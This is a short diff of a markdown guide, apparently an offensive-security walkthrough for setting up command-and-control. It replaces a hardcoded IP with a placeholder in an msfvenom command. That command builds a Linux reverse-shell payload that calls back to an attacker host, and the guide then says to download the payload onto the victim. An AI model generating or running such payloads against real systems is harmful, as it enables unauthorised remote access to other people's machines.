@@ -53,7 +53,7 @@
     ```
 7. From here we can now create a msfvenom shell or poshc2 with the correct ports set in the TCP section in the example we have `8080` 
     ```bash
-   msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.178.132 LPORT=8080 -a x64 -f elf > yup.elf
+   msfvenom -p linux/x64/shell_reverse_tcp LHOST=<proxy-ip> LPORT=8080 -a x64 -f elf > yup.elf
     ```
     > **NOTE:** Follow the same setup if you are using poshc2 for you bind port, probably 
 8. Host your payload however and download on victim 
